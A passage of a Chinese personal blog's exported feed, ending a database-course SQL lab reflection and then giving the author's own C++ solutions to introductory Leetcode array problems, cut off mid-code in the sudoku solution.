class="hljs-string">&#x27;S1&#x27;</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>结果：</p><p>   <img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325165039739.png" alt="image-20220325165039739"></p></li></ul></li></ol><h2 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h2><p>通过这次实验，我学会通过SQL语句对基本表、索引和视图进行创建、修改及删除，并完成各类的查询数据、更新数据操作。在整个实验过程中，主要有三个注意点：</p><ul><li>一是<code>IN</code>或<code>NOT IN</code>前需要指定字段，否则会产生SQL语法错误，例子如下：</li></ul><p><img src="/2022/04/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E4%BA%A4%E4%BA%92%E5%BC%8FSQL/image-20220325120605243.png" alt="image-20220325120605243"></p><ul><li><p>二是使用<code>INSERT</code>语句插入、<code>UPDATE</code>语句更新数据时注意字段在表中顺序。</p></li><li><p>三是要注意数据库完整性，包括：</p><ul><li>实体完整性，要求每个关系（表）有且仅有一个主键，每一个主键值必须唯一，而且不允许为“空”（NULL）或重复。</li><li>域完整性，指数据库表中的列必须满足某种特定的数据类型或约束。</li><li>参照完整性，属于表间规则。对于永久关系的相关表，在更新、插入或删除记录时，如果只改其一，就会影响数据的完整性。故删除一个表的主键时，若它是另一个表的外键，要先把在另一个表中把这个外键删除。</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>数据库系统课程实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库系统实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Leetcode 数据结构入门</title>
    <link href="/2022/04/07/Leetcode_%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%A5%E9%97%A8/"/>
    <url>/2022/04/07/Leetcode_%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Leetcode-数据结构入门（C-）"><a href="#Leetcode-数据结构入门（C-）" class="headerlink" title="Leetcode 数据结构入门（C++）"></a>Leetcode 数据结构入门（C++）</h1><p>每题第一个代码均为本人所写代码，并非最优解，部分解法参考题解。</p><h2 id="第-1-天-数组"><a href="#第-1-天-数组" class="headerlink" title="第 1 天 数组"></a>第 1 天 数组</h2><h3 id="217-存在重复元素"><a href="#217-存在重复元素" class="headerlink" title="217. 存在重复元素"></a><a href="https://leetcode-cn.com/problems/contains-duplicate/">217. 存在重复元素</a></h3><p>给你一个整数数组 <code>nums</code> 。如果任一值在数组中出现 <strong>至少两次</strong> ，返回 <code>true</code> ；如果数组中每个元素互不相同，返回 <code>false</code> 。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">containsDuplicate</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; m;<br>        <span class="hljs-type">bool</span> result=<span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;nums.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(m.<span class="hljs-built_in">find</span>(nums[i])==m.<span class="hljs-built_in">end</span>())<br>                m[nums[i]]=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(m[nums[i]])<br>            &#123;<br>                result=<span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n)</li><li>数组，哈希表</li></ul><h3 id="53-最大子数组和"><a href="#53-最大子数组和" class="headerlink" title="53. 最大子数组和"></a><a href="https://leetcode-cn.com/problems/maximum-subarray/">53. 最大子数组和</a></h3><p>给你一个整数数组 <code>nums</code> ，请你找出一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。</p><p><strong>子数组</strong> 是数组中的一个连续部分。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxSubArray</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> sum=nums[<span class="hljs-number">0</span>],result=nums[<span class="hljs-number">0</span>]; <span class="hljs-comment">//以防只有负数</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;nums.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(sum&lt;<span class="hljs-number">0</span>)                   <span class="hljs-comment">//sum若为负，加下一个数前先归零</span><br>                sum=<span class="hljs-number">0</span>;<br>            sum+=nums[i];<br>            <span class="hljs-keyword">if</span>(sum&gt;result)<br>                result=sum;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n)</li><li>数组，动态规划</li></ul><h2 id="第-2-天-数组"><a href="#第-2-天-数组" class="headerlink" title="第 2 天 数组"></a>第 2 天 数组</h2><h3 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a><a href="https://leetcode-cn.com/problems/two-sum/">1. 两数之和</a></h3><p>给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target  的那 两个 整数，并返回它们的数组下标。</p><p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p><p>你可以按任意顺序返回答案。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; result;<br>        unordered_map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; hash; <span class="hljs-comment">//哈希表</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;nums.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(hash.<span class="hljs-built_in">find</span>(target-nums[i])!=hash.<span class="hljs-built_in">end</span>()) <span class="hljs-comment">//存在target-nums[i]</span><br>            &#123;<br>                result.<span class="hljs-built_in">push_back</span>(hash[target-nums[i]]);<br>                result.<span class="hljs-built_in">push_back</span>(i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            hash[nums[i]]=i; <span class="hljs-comment">//防止target=2*nums[i]</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n)</li><li>数组，哈希表</li></ul><h3 id="88-合并两个有序数组"><a href="#88-合并两个有序数组" class="headerlink" title="88. 合并两个有序数组"></a><a href="https://leetcode-cn.com/problems/merge-sorted-array/">88. 合并两个有序数组</a></h3><p>给你两个按 非递减顺序 排列的整数数组 nums1 和 nums2，另有两个整数 m 和 n ，分别表示 nums1 和 nums2 中的元素数目。</p><p>请你 合并 nums2 到 nums1 中，使合并后的数组同样按 非递减顺序 排列。</p><p>注意：最终，合并后数组不应由函数返回，而是存储在数组 nums1 中。为了应对这种情况，nums1 的初始长度为 m + n，其中前 m 个元素表示应合并的元素，后 n 个元素为 0 ，应忽略。nums2 的长度为 n 。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">merge</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums1, <span class="hljs-type">int</span> m, vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums2, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; result;<br>        <span class="hljs-type">int</span> length=m+n;<br>        <span class="hljs-type">int</span> r1=m,r2=n;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;length;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(r1&gt;<span class="hljs-number">0</span>&amp;&amp;r2&gt;<span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(nums1[m-r1]&lt;=nums2[n-r2])<br>                &#123;<br>                    result.<span class="hljs-built_in">push_back</span>(nums1[m-r1]);<br>                    nums1.<span class="hljs-built_in">pop_back</span>();<br>                    r1--;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    result.<span class="hljs-built_in">push_back</span>(nums2[n-r2]);<br>                    nums2.<span class="hljs-built_in">pop_back</span>();<br>                    r2--;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(r1&gt;<span class="hljs-number">0</span>)<br>            &#123;<br>                result.<span class="hljs-built_in">push_back</span>(nums1[m-r1]);<br>                nums1.<span class="hljs-built_in">pop_back</span>();<br>                r1--;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(r2&gt;<span class="hljs-number">0</span>)<br>            &#123;<br>                result.<span class="hljs-built_in">push_back</span>(nums2[n-r2]);<br>                nums2.<span class="hljs-built_in">pop_back</span>();<br>                r2--;<br>            &#125;<br>        &#125;<br>        nums1=result;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度O(m+n)</li><li>数组，排序</li></ul><h2 id="第-3-天-数组"><a href="#第-3-天-数组" class="headerlink" title="第 3 天 数组"></a>第 3 天 数组</h2><h3 id="350-两个数组的交集-II"><a href="#350-两个数组的交集-II" class="headerlink" title="350. 两个数组的交集 II"></a><a href="https://leetcode-cn.com/problems/intersection-of-two-arrays-ii/">350. 两个数组的交集 II</a></h3><p>给你两个整数数组 nums1 和 nums2 ，请你以数组形式返回两数组的交集。返回结果中每个元素出现的次数，应与元素在两个数组中都出现的次数一致（如果出现次数不一致，则考虑取较小值）。可以不考虑输出结果的顺序。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">intersect</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums1, vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums2)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; hash1;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;nums1.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(hash1.<span class="hljs-built_in">find</span>(nums1[i])==hash1.<span class="hljs-built_in">end</span>())<br>            &#123;<br>                hash1[nums1[i]]=<span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                hash1[nums1[i]]++;<br>            &#125;<br>        &#125;<br>        vector&lt;<span class="hljs-type">int</span>&gt; result;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;nums2.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(hash1[nums2[i]]&gt;<span class="hljs-number">0</span>)<br>            &#123;<br>                hash1[nums2[i]]--;<br>                result.<span class="hljs-built_in">push_back</span>(nums2[i]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(max(nums1.length, nums2.length)) 即O(n)</li><li>数组，哈希表，排序</li></ul><h3 id="121-买卖股票的最佳时机"><a href="#121-买卖股票的最佳时机" class="headerlink" title="121. 买卖股票的最佳时机"></a><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/">121. 买卖股票的最佳时机</a></h3><p>给定一个数组 prices ，它的第 i 个元素 prices[i] 表示一支给定股票第 i 天的价格。</p><p>你只能选择 某一天 买入这只股票，并选择在 未来的某一个不同的日子 卖出该股票。设计一个算法来计算你所能获取的最大利润。</p><p>返回你可以从这笔交易中获取的最大利润。如果你不能获取任何利润，返回 0 。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxProfit</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; prices)</span> </span>&#123;<br>        <span class="hljs-type">int</span> result=<span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> bgn=<span class="hljs-number">0x3f3f3f</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;prices.<span class="hljs-built_in">size</span>();i++) <span class="hljs-comment">//动态规划：前i+1天的最低点 和 后n-i-1天的最高点</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(prices[i]&lt;bgn)<br>            &#123;<br>                bgn=prices[i];<br>            &#125;<br>            <span class="hljs-keyword">if</span>(prices[i]&gt;bgn&amp;&amp;result&lt;prices[i]-bgn)<br>            &#123;<br>                result=prices[i]-bgn;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n)</li><li>数组，动态规划</li></ul><h2 id="第-4-天-数组"><a href="#第-4-天-数组" class="headerlink" title="第 4 天 数组"></a>第 4 天 数组</h2><h3 id="566-重塑矩阵"><a href="#566-重塑矩阵" class="headerlink" title="566. 重塑矩阵"></a><a href="https://leetcode-cn.com/problems/reshape-the-matrix/">566. 重塑矩阵</a></h3><p>在 MATLAB 中，有一个非常有用的函数 reshape ，它可以将一个 m x n 矩阵重塑为另一个大小不同（r x c）的新矩阵，但保留其原始数据。</p><p>给你一个由二维数组 mat 表示的 m x n 矩阵，以及两个正整数 r 和 c ，分别表示想要的重构的矩阵的行数和列数。</p><p>重构后的矩阵需要将原始矩阵的所有元素以相同的 行遍历顺序 填充。</p><p>如果具有给定参数的 reshape 操作是可行且合理的，则输出新的重塑矩阵；否则，输出原始矩阵。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">matrixReshape</span>(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; mat, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> c) &#123;<br>        <span class="hljs-type">int</span> m=mat.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> n=mat[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> num=m*n;<br>        <span class="hljs-keyword">if</span>(r*c!=num)<br>            <span class="hljs-keyword">return</span> mat;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">result</span>(r,<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(c));   <span class="hljs-comment">//注意初始化方式</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;r;i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;c;j++)<br>            &#123;<br>                result[i][j]=mat[(c*i+j)/n][(c*i+j)%n];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(r*c)</li><li>数组，矩阵，模拟</li></ul><h3 id="118-杨辉三角"><a href="#118-杨辉三角" class="headerlink" title="118. 杨辉三角"></a><a href="https://leetcode-cn.com/problems/pascals-triangle/">118. 杨辉三角</a></h3><p>给定一个非负整数 <em><code>numRows</code>，</em>生成「杨辉三角」的前 <em><code>numRows</code></em> 行。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">generate</span>(<span class="hljs-type">int</span> numRows) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">result</span>(numRows);<br>        result[<span class="hljs-number">0</span>]=&#123;<span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;numRows;i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;i+<span class="hljs-number">1</span>;j++)<br>            &#123;<br>                <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span>(j<span class="hljs-number">-1</span>&gt;=<span class="hljs-number">0</span>)<br>                    num+=result[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>];<br>                <span class="hljs-keyword">if</span>(j&lt;=i<span class="hljs-number">-1</span>)  <br>                    num+=result[i<span class="hljs-number">-1</span>][j];<br>                result[i].<span class="hljs-built_in">push_back</span>(num);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度：O(n^2)</li><li>数组</li></ul><h2 id="第-5-天-数组"><a href="#第-5-天-数组" class="headerlink" title="第 5 天 数组"></a>第 5 天 数组</h2><h3 id="36-有效的数独"><a href="#36-有效的数独" class="headerlink" title="36. 有效的数独"></a><a href="https://leetcode-cn.com/problems/valid-sudoku/">36. 有效的数独</a></h3><p>请你判断一个 9 x 9 的数独是否有效。只需要 根据以下规则 ，验证已经填入的数字是否有效即可。</p><p>数字 1-9 在每一行只能出现一次。<br>数字 1-9 在每一列只能出现一次。<br>数字 1-9 在每一个以粗实线分隔的 3x3 宫内只能出现一次。（请参考示例图）</p><p> <img src="/2022/04/07/Leetcode_%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%A5%E9%97%A8/250px-sudoku-by-l2g-20050714svg.png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValidSudoku</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; board)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">9</span>;i++)<br>        &#123;<br>            unordered_map&lt;<span class="hljs-type">char</span>,<span class="hljs-type">int</span>&gt; hash;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">9</span>;j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(board[i][j]&gt;=<span class="hljs-string">&#x27;0&#x27;</span>&amp;&amp;board[i][j]&lt;=<span class="hljs-string">&#x27;9&#x27;</span>)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(hash[board[i][j]]==<span class="hljs-number">0</span>)<br>                    &#123;<br>                        hash[board[i][j]]=<span class="hljs-number">1</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                    <span class="hljs-keyword">continue</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">9</span>;j++)<br>        &#123;<br>            unordered_map&lt;<span class="hljs-type">char</span>,<span class="hljs-type">int</span>&gt; hash;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">9</span>;i++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(board[i][j]&gt;=<span class="hljs-string">&#x27;0&#x27;</span>&amp;&amp;board[i][j]&lt;=<span class="hljs-string">&#x27;9&#x27;</span>)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(hash[board[i][j]]==<span class="hljs-number">0</span>)<br>                    &#123;<br>                        hash[board[i][j]]=<span class="hljs-number">1</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                    <span class="hljs-keyword">continue</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;<span class="hljs-number">9</span>;k++)<br>        &#123;<br>            unordered_map&lt;<span class="hljs-type">char</span>,<span class="hljs-type">int</span>&gt; hash;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">3</span>;i++)<br>            &#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">3</span>;j++)<br>                &#123;<br>                    <span class="hljs-type">char</span> num=board[k/<span class="hljs-number">3</span>*<span class="hljs-number">3</span>+i][k%<span class="hljs-number">3</span>*<span class="hljs-number">3</span>+j];<br>                    <span class="hljs-keyword">if</span>(num&gt;=<span 